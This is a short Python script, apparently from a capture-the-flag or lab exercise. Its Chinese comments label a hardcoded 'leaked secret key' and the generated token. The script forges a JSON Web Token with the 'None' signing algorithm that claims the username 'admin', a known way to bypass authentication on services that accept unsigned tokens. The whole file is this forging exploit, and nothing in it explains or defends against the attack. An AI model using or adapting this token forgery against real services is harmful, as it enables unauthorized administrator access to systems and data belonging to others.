import jwt
import sys

sys.stdout.reconfigure(encoding='utf-8')
# 泄露的密钥
secret_key = "1Kun"

# 载荷数据
payload = {
    "username": "admin"
}

# 头部数据
headers = {
    "alg": "None",
    "typ": "JWT"
}

# 生成JWT
new_token = jwt.encode(payload, key=secret_key, algorithm="None", headers=headers)
print("新生成的JWT:", new_token)